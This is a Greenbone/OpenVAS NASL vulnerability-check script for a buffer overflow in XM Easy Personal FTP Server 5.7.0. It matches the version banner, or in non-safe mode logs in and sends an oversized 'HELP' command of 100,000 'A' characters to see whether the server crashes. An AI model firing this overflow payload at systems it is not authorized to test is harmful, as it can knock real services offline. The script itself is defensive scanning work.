# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100223");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2009-06-14 17:19:03 +0200 (Sun, 14 Jun 2009)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("XM Easy Personal FTP Server Multiple Command Remote Buffer Overflow Vulnerabilities");
  script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/xm_easy_personal/detected");

  script_tag(name:"summary", value:"XM Easy Personal FTP Server is prone to multiple remote
  buffer-overflow vulnerabilities because the application fails to
  sufficiently sanitize user-supplied arguments to multiple FTP commands.");

  script_tag(name:"impact", value:"An attacker can exploit these issues to execute arbitrary code in
  the context of the affected application. Failed exploit attempts
  will result in a denial-of-service condition.");

  script_tag(name:"affected", value:"XM Easy Personal FTP Server 5.7.0 is vulnerable. Other versions may
  also be affected.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/35239");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");
include("version_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if( !banner || "Welcome to DXM's FTP Server" >!< banner )
  exit(0);

if(safe_checks()) {
  if(egrep(pattern: "Welcome to DXM's FTP Server", string:banner)) {
    version = eregmatch(pattern:"Welcome to DXM's FTP Server ([0-9.]+)", string:banner);
    if(version[1] && version_is_equal(version:version[1], test_version:"5.7.0")) {
      report = report_fixed_ver(installed_version:version[1], fixed_version:"WillNotFix");
      security_message(port:ftpPort, data:report);
      exit(0);
    }
  }
} else {

  soc1 = open_sock_tcp(ftpPort);
  if(!soc1)
    exit(0);

  kb_creds = ftp_get_kb_creds();
  user = kb_creds["login"];
  pass = kb_creds["pass"];

  login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
  if(login_details) {
    ftpPort2 = ftp_get_pasv_port(socket:soc1);
    if(ftpPort2) {
      soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
      if(soc2) {
        bo_data = string("HELP ", crap(length: 100000, data:"A"));
        send(socket:soc1, data:bo_data);
        close(soc2);
        close(soc1);

        sleep(2);

        soc3 = open_sock_tcp(ftpPort);

        if(!ftp_recv_line(socket:soc3)) {
          security_message(port:ftpPort);
          close(soc3);
          exit(0);
        }
      }
    }
  }
}

exit(0);
